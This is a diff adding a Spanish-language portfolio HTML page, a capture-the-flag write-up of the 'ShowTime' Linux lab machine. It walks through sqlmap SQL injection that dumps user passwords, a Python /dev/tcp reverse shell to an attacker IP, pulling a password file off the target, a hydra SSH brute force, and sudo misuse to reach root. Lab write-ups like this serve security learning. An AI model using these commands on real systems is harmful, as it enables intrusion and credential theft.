@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Paradis</title>
+  <link href="../style/estilo.css" rel="stylesheet">
+  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+  <link rel="stylesheet"
+    href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+</head>
+
+<body class="bg-gray-900 text-white">
+
+    <nav class="bg-gray-800 text-white sticky top-0 z-50 shadow-md">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+        <div class="flex justify-between items-center h-16">
+            <div class="flex-shrink-0">
+            <h1>Santiago Lorenzo</h1>
+            </div>
+            <div class="hidden md:flex space-x-4">
+            <a href="../index.html#inicio" class="hover:text-blue-400 transition">Inicio</a>
+            <a href="../index.html#certificados" class="hover:text-blue-400 transition">Certificaciones</a>
+            <a href="../index.html#proyectos" class="hover:text-blue-400 transition">Proyectos</a>
+            <a href="../writeups.html" class="hover:text-blue-400 transition">Write-ups</a>
+            </div>
+        </div>
+        </div>
+    </nav>
+
+    <main class="max-w-4xl mx-auto px-6 py-12">
+
+    <h1 class="text-4xl font-bold mb-2">🔹Maquina: ShowTime</h1>
+    <p class="text-gray-400 text-sm mb-8">📅 Publicado el 14/08/2025 | Categoría: LINUX </p>
+
+    <section class="mb-8">
+        <h2 class="text-2xl font-semibold mb-2">📝 Descripción</h2>
+        <p class="text-gray-300 leading-relaxed">
+            Este reto consiste en comprometer una máquina Linux en un entorno controlado. No se proporciona una flag directa,
+            pero el objetivo es obtener acceso privilegiado (root) y entender el vector de escalada a través de un script de backup vulnerable.
+        </p>
+    </section>
+
+    <!----------------- Análisis ----------------------->
+    <section class="mb-8">
+        <h2 class="text-2xl font-semibold mb-2">🔍 Análisis inicial</h2>
+        <p class="text-gray-300 mb-4">
+            El análisis comenzó con un reconocimiento básico utilizando herramientas de enumeración para comprender los servicios expuestos.
+            Una vez dentro del sistema como usuario limitado, buscamos posibles vectores de escalada de privilegios.
+        </p>
+        <pre><code class="language-bash">
+            sudo nmap -p- -open -O -sS -sC -min-rate 5000 -n -Pn 172.17.0.2
+            
+                PORT   STATE SERVICE
+                22/tcp open  ssh
+                | ssh-hostkey: 
+                |   256 e1:9a:9f:b3:17:be:3d:2e:12:05:0f:a4:61:c3:b3:76 (ECDSA)
+                |_  256 69:8f:5c:4f:14:b0:4d:b6:b7:59:34:4d:b9:03:40:75 (ED25519)
+                80/tcp open  http
+                |_http-title: cs
+        </code></pre>
+
+        <p class="text-gray-300 mt-4">
+            en el http encontramos http://172.17.0.2/login_page/ el cual tiene la vulnerabilidad de inyeccion de sql, 
+            al saber esto capture la peticion con burp suit y la guarde en log.txt para luego usarla con sqlmap.
+        </p>
+
+        <pre><code class="language-bash">
+            sqlmap -r log.txt --batch --random-agent --dbs
+
+                available databases [5]:
+                [*] information_schema
+                [*] mysql
+                [*] performance_schema
+                [*] sys
+                [*] users
+
+
+        </code></pre>
+        <pre><code class="language-bash">
+            sqlmap -r log.txt --batch --random-agent --dbs
+
+                available databases [5]:
+                [*] information_schema
+                [*] mysql
+                [*] performance_schema
+                [*] sys
+                [*] users
+
+            sqlmap -r log.txt --batch --random-agent -D users --tables
+
+                Database: users
+                [1 table]
+                +----------+
+                | usuarios |
+                +----------+
+
+            sqlmap -r log.txt --batch --random-agent -D users -T usuarios --columns
+
+                Database: users
+                Table: usuarios
+                [3 columns]
+                +----------+--------------+
+                | Column   | Type         |
+                +----------+--------------+
+                | id       | int unsigned |
+                | password | varchar(50)  |
+                | username | varchar(50)  |
+                +----------+--------------+
+
+            sqlmap -r log.txt --batch --random-agent -D users -T usuarios -C password,username --dump 
+
+                +----------------------+----------+
+                | password             | username |
+                +----------------------+----------+
+                | 123321123321         | lucas    |
+                | 123456123456         | santiago |
+                | MiClaveEsInhackeable | joe      |
+                +----------------------+----------+
+
+        </code></pre>
+
+        <p class="text-gray-300 mt-4">
+            Entramos como joe, ahora tenemos acceso a /admin-panel.php donde se pueden ejecutar comandos en python.
+        </p>
+
+        <p class="text-gray-300 mb-4">
+            puduen hacer eso creamos una reverse shell
+        </p>
+
+        <pre><code class="language-bash">
+            __import__('os').system("bash -c 'bash -i >& /dev/tcp/192.168.1.9/4444 0>&1'")
+        </code></pre>
+
+    <!-- Explotación / Resolución -->
+    <section class="mb-8">
+        <h2 class="text-2xl font-semibold mb-2">💣 Escalada de privilegios / Resolución</h2>
+        <p class="text-gray-300 mb-4">
+            En tmp encontre un archivo que parecia que contenia contraseñas(.hidden_text.txt):
+        </p>
+
+        <pre><code class="language-bash">
+            www-data@f058948a36db:/tmp$ ls -la  
+            ls -la
+            total 20
+            drwxrwxrwt 1 root     root     4096 Aug 12 17:45 .
+            drwxr-xr-x 1 root     root     4096 Aug 12 17:43 ..
+            -rw-r--r-- 1 root     root      894 Jul 22  2024 .hidden_text.txt
+            -rw-r--r-- 1 www-data www-data   80 Aug 12 17:45 temp_script.py
+            drwx------ 2 mysql    mysql    4096 Jul 22  2024 tmp.w3E3JvWoeD
+        </code></pre>
+
+        <p class="text-gray-300 mt-4">
+            Lo  descargue usando python situado en la maquina victima:
+        </p>
+
+        <pre><code class="language-bash">
+            python3 -m http.server 8000
+        </code></pre>
+
+        <p class="text-gray-300 mt-4">
+            Situado en la maquina atacante:
+        </p>
+
+        <pre><code class="language-bash">
+            wget http://172.17.0.2:8000/.hidden_text.txt
+        </code></pre>
+
+        <p class="text-gray-300 mt-4">
+            Convertimos las mayusculas en minusculas
+        </p>
+
+        <pre><code class="language-bash">
+            cat .hidden_text.txt | tr '[:upper:]' '[:lower:]' > pass_final.txt
+        </code></pre>
+
+        <p class="text-gray-300 mt-4">
+            hacemos fueza bruta en ssh:
+        </p>
+
+        <pre><code class="language-bash">
+            hydra -l joe -P pass_final.txt ssh://172.17.0.2 -t 20 -V -I
+                [22][ssh] host: 172.17.0.2   login: joe   password: chittychittybangbang
+        </code></pre>
+
+        <p class="text-gray-300 mt-4">
+            Escalamos de joe a luciano
+        </p>
+
+        <pre><code class="language-bash">
+            joe@f058948a36db:~$ sudo -l
+            Matching Defaults entries for joe on f058948a36db:
+                env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+            User joe may run the following commands on f058948a36db:
+                (luciano) NOPASSWD: /bin/posh
+            joe@f058948a36db:~$ sudo -u luciano /bin/posh
+            $ whoami
+                luciano
+        </code></pre>
+
+        <p class="text-gray-300 mt-4">
+            Volvemos a hace un sudo -l:
+        </p>
+
+        <pre><code class="language-bash">
+            sudo -l
+                Matching Defaults entries for luciano on f058948a36db:
+                    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+                User luciano may run the following commands on f058948a36db:
+                    (root) NOPASSWD: /bin/bash /home/luciano/script.sh
+        </code></pre>
+
+        <p class="text-gray-300 mt-4">
+            Nos movemos a /home/luciano/ para modificar script.sh 
+            y lo modificamos con echo porque no tiene ningun editor:
+        </p>
+
+        <pre><code class="language-bash">
+            cat script.sh
+                #!/bin/bash
+
+
+                IP="192.168.1.100"
+                PORT="4444"
+
+                bash -c 'exec 5<>/dev/tcp/'$IP'/'$PORT'; cat <&5 | bash >&5 2>&5'
+            $ echo '#!/bin/bash
+            > bash -p' > script.sh
+            $ cat script.sh
+                #!/bin/bash
+                bash -p
+        </code></pre>
+
+        <p class="text-gray-300 mt-4">
+            Ejecutamos el script como el usuario root y ya nos habremos convertido en usuario root.
+        </p>
+        <pre><code class="language-bash">
+            sudo /bin/bash /home/luciano/script.sh
+
+            root@f058948a36db:/home/luciano# whoami
+                root
+        </code></pre>
+
+    </section>
+
+    <!-- Resultado final -->
+    <section class="mb-8">
+        <h2 class="text-2xl font-semibold mb-2">🏆 Resultado</h2>
+        <p class="text-gray-300">
+            Conseguimos acceso como <code>root</code>.
+        </p>
+    </section>
+
+    <div class="mt-10">
+        <a href="../writeup.html"
+            class="inline-block bg-blue-500 px-6 py-2 rounded-lg text-white hover:bg-blue-700 transition">
+            ← Volver a la lista de Write-ups
+        </a>
+    </div>
+
+    </main>
+
+</body>
+</html>
